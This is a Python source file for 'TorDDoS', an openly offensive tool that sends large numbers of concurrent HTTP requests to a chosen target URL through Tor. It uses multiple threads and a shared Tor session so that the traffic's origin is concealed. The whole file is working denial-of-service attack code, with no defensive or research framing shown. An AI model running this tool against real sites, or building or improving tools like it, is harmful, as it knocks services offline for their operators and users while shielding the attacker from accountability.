#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# TorDDoS - Updated 2025
# Original by R3nt0n (https://www.github.com/R3nt0n)
# Updated for Python 3 with threading and improved reliability

import sys
import datetime
import threading
import time

from lib.color import color
from lib.tor import Tor


def attack_worker(
    tor: Tor,
    target: str,
    counter_lock: threading.Lock,
    counter: list,
    max_attempts: int,
) -> None:
    """
    Thread worker: fires a single HTTP request through the shared Tor session.
    The session is created once (on first call to get_session()) and reused
    by all threads — no per-thread NEWNYM, no circuit fighting.
    """
    session = tor.get_session()
    if session is None:
        print(f'{color.RED}[!]{color.END} No Tor session available, skipping request.')
        return

    with counter_lock:
        if counter[0] >= max_attempts:
            return
        counter[0] += 1
        current = counter[0]

    print(f'{color.PURPLE}[+]{color.END} [{current}/{max_attempts}] '
          f'Target: {color.PURPLE}{target}{color.END}')
    try:
        print(f'{color.ORANGE}[*]{color.END} Sending request #{current}...')
        response = session.get(target, timeout=20)
        print(f'{color.GREEN}[*]{color.END} Request #{current} — '
              f'HTTP {color.GREEN}{response.status_code}{color.END}')
    except Exception as e:
        print(f'{color.RED}[!]{color.END} Request #{current} failed: {color.RED}{e}{color.END}')


def main(target: str, max_attempts: int, threads: int) -> None:
    tor = Tor()

    if not tor.tor_installed():
        print(f'{color.RED}[!]{color.END} Tor is not installed. '
              f'Please run: sudo apt install tor')
        sys.exit(1)

    if not tor.tor_started():
        print(f'{color.YELLOW}[!]{color.END} Tor service is not running. '
              f'Attempting to start it...')
        tor.start_tor()
        if not tor.tor_started():
            print(f'{color.RED}[!]{color.END} Failed to start Tor. Exiting.')
            sys.exit(1)

    # Warm up: initialise the shared session before spawning threads
    print(f'{color.BLUE}[!]{color.END} Initialising Tor session...')
    session = tor.get_session()
    if session is None:
        print(f'{color.RED}[!]{color.END} Cannot reach Tor SOCKS5 proxy. '
              f'Is Tor running?')
        sys.exit(1)

    print(f'\n{color.BLUE}[!]{color.END} Starting attack on '
          f'{color.BLUE}{target}{color.END}')
    print(f'{color.BLUE}[!]{color.END} Max attempts: {max_attempts} | '
          f'Threads: {threads}\n')

    start_time = datetime.datetime.now()
    counter = [0]
    counter_lock = threading.Lock()
    active_threads: list[threading.Thread] = []

    try:
        while counter[0] < max_attempts:
            # Prune finished threads
            active_threads = [t for t in active_threads if t.is_alive()]
            if len(active_threads) >= threads:
                time.sleep(0.2)
                continue

            t = threading.Thread(
                target=attack_worker,
                args=(tor, target, counter_lock, counter, max_attempts),
                daemon=True,
            )
            t.start()
            active_threads.append(t)

        # Wait for all in-flight threads to finish
        for t in active_threads:
            t.join()

    except KeyboardInterrupt:
        print(f'\n{color.YELLOW}[!]{color.END} Interrupted by user.')

    finally:
        end_time = datetime.datetime.now()
        elapsed = end_time - start_time
        print(f'\n{color.GREEN}[+]{color.END} Time elapsed:   {elapsed}')
        print(f'{color.GREEN}[+]{color.END} Requests fired: {counter[0]}')
        print(f'{color.RED}[!]{color.END} Stopping Tor...')
        tor.stop_tor()
        print(f'{color.RED}[!]{color.END} Done.\n')
        sys.exit(0)


if __name__ == '__main__':
    from lib.args import parser
    args = parser.parse_args()

    if not args.target:
        parser.print_help(sys.stdout)
        sys.exit(2)

    main(target=args.target, max_attempts=args.max_attempts, threads=args.threads)
